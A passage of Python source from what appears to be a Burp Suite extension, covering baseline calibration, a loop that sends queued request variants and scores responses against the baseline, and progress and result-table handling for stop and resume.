            if status is not None and baseline["status"] is not None and status != baseline["status"]: interesting = True
            if abs((length or 0) - (baseline["length"] or 0)) > tolerance: interesting = True
        return score, likelihood, reason, interesting

    def _ensure_baseline(self):
        if self._baseline_cache is not None: return self._baseline_cache
        SwingUtilities.invokeLater(lambda: self._set_status("Sending baseline request..."))
        r = self._send_op({"kind": "baseline"})
        baseline = {"status": r["status"], "length": r["length"], "location": r["location"], "content_type": r["content_type"], "server": r["server"], "body_hash": r["body_hash"]}
        tolerance = CALIBRATION_TOLERANCE_DEFAULT
        if self._cb_calibrate.isSelected():
            SwingUtilities.invokeLater(lambda: self._set_status("Auto-calibrating baseline..."))
            calib = self._calibrate(self._base_info, self._base_info.getMethod())
            tolerance = calib["tolerance"]
            if calib["status"] is not None:
                baseline = {"status": calib["status"], "length": calib["length"], "location": calib["location"], "content_type": calib["content_type"], "server": calib["server"], "body_hash": calib["body_hash"]}
            self._calib_fragment_length = calib["fragment_length"]
        else: self._calib_fragment_length = None

        score, likelihood, reason, _ = self._score_and_flag(baseline["status"], baseline["length"], baseline["location"], baseline["content_type"], baseline["server"], baseline["body_hash"], baseline, tolerance)
        result = Result("default", "(baseline)", r["method"], r["status"], r["length"], True, r["req_bytes"], r["resp_bytes"], self._base_service, baseline["location"], baseline["content_type"], baseline["server"], baseline["body_hash"], score, likelihood, reason)
        self._add_result(result, {"kind": "baseline"})
        self._baseline_cache = (baseline, tolerance)
        return self._baseline_cache

    def _run_ops(self, tab_name, ops):
        self._stop_flag[0] = False
        self._active_tab = tab_name
        SwingUtilities.invokeLater(lambda tn=tab_name: self._refresh_global_progress("Starting %s..." % ("all tabs" if tn == "GLOBAL" else tn)))
        SwingUtilities.invokeLater(lambda tn=tab_name: self._set_tabs_busy(True, tn))
        try:
            try: baseline, tolerance = self._ensure_baseline()
            except Exception as e:
                self._log("Baseline error: %s" % str(e))
                SwingUtilities.invokeLater(lambda msg="Baseline failed: %s" % str(e): self._refresh_global_progress(msg))
                if tab_name == "GLOBAL":
                    for tn in self._tab_data:
                        self._tab_data[tn]["pending_ops"] = []
                elif tab_name in self._tab_data:
                    self._tab_data[tab_name]["pending_ops"] = []
                    
                for op in ops:
                    tn = TECHNIQUE_KEY_TO_TAB.get(op.get("technique"))
                    if tn and tn in self._tab_data:
                        self._tab_data[tn]["pending_ops"].append(op)
                return

            total = len(ops)
            if total == 0:
                SwingUtilities.invokeLater(lambda m="Baseline refreshed." if tab_name == "Baseline" else "Nothing to send.": self._refresh_global_progress(m))
                if tab_name == "GLOBAL":
                    for tn in self._tab_data:
                        self._tab_data[tn]["pending_ops"] = []
                elif tab_name in self._tab_data:
                    self._tab_data[tab_name]["pending_ops"] = []
                return

            # Snapshot how much of this tab's technique set was already sent
            # before this run started. A Resume only receives the leftover
            # ops, so without this the on-screen counter would restart at
            # 1/N-remaining and look like the run had gone back to variant 1
            # -- even though the earlier results are (correctly) still
            # sitting in the table and nothing is actually being resent.
            if tab_name == "GLOBAL":
                already_done = self._global_done_count()
                display_total = self._ensure_global_total() or total
            else:
                tab_data = self._tab_data.get(tab_name, {})
                already_done = tab_data.get("sent", 0)
                display_total = tab_data.get("total_ops") or (already_done + total)

            done = 0
            remaining = []
            for i, op in enumerate(ops):
                if self._stop_flag[0]:
                    remaining = ops[i:]
                    break

                r = self._send_op(op)
                score, likelihood, reason, interesting = self._score_and_flag(r["status"], r["length"], r["location"], r["content_type"], r["server"], r["body_hash"], baseline, tolerance)
                self._bump_tab_sent(r["technique"])

                if interesting or not self._cb_only_interesting.isSelected():
                    result = Result(r["technique"], r["detail"], r["method"], r["status"], r["length"], interesting, r["req_bytes"], r["resp_bytes"], self._base_service, r["location"], r["content_type"], r["server"], r["body_hash"], score, likelihood, reason)
                    self._add_result(result, op)

                done += 1
                d_disp = already_done + done
                SwingUtilities.invokeLater(lambda tn=tab_name, d=d_disp, t=display_total: self._refresh_global_progress(
                    "%s: %d/%d" % ("All tabs" if tn == "GLOBAL" else tn, d, t)))

            if tab_name == "GLOBAL":
                for tn in self._tab_data:
                    self._tab_data[tn]["pending_ops"] = []
            elif tab_name in self._tab_data:
                self._tab_data[tab_name]["pending_ops"] = []
            
            for op in remaining:
                tn = TECHNIQUE_KEY_TO_TAB.get(op.get("technique"))
                if tn and tn in self._tab_data:
                    self._tab_data[tn]["pending_ops"].append(op)
        finally:
            self._active_tab = None
            
            def update_status_and_buttons():
                self._set_tabs_busy(False, None)
                if tab_name == "GLOBAL":
                    tot_pend = sum(len(d.get("pending_ops", [])) for n, d in self._tab_data.items() if n != "GLOBAL")
                else:
                    tot_pend = len(self._tab_data.get(tab_name, {}).get("pending_ops", []))
                label = "All tabs" if tab_name == "GLOBAL" else tab_name
                if tot_pend > 0:
                    msg = "%s stopped -- %d pending." % (label, tot_pend)
                else:
                    msg = "%s done." % label
                self._refresh_global_progress(msg)

            SwingUtilities.invokeLater(update_status_and_buttons)

    def _refresh_tab_title(self, name):
        data = self._tab_data.get(name)
        if data is None or data.get("index") is None: return
        shown = len(data["results"])
        title = "%s (%d)" % (name, shown) if shown else name
        self._results_tabs.setTitleAt(data["index"], title)

    def _bump_tab_sent(self, technique):
        tab_name = TECHNIQUE_KEY_TO_TAB.get(technique)
        names = []
        if tab_name: names.append(tab_name)
        SwingUtilities.invokeLater(lambda names=names: [data.update({"sent": data.get("sent", 0) + 1}) or self._refresh_tab_title(name) for name in names for data in [self._tab_data.get(name)] if data])

    def _url_for_result(self, result):
        try:
            info = self._helpers.analyzeRequest(result.http_service, result.request_bytes)
            return str(info.getUrl())
        except Exception:
            return "-"

    def _row_for_result(self, result):
        return [False, self._url_for_result(result), result.detail, str(result.status) if result.status is not None else "ERR", str(result.length) if result.length is not None else "-"]

    def _add_result(self, result, job_ref):
        self._results.append(result)
        row = self._row_for_result(result)
        tab_name = TECHNIQUE_KEY_TO_TAB.get(result.technique)
        target_tabs = []
        if tab_name: target_tabs.append(tab_name)
        SwingUtilities.invokeLater(lambda: [data["model"].addRow(row) or data["results"].append(result) or data["jobs_by_row"].append(job_ref) or self._refresh_tab_title(name) for name in target_tabs for data in [self._tab_data.get(name)] if data])

    def extensionUnloaded(self):
        self._stop_flag[0] = True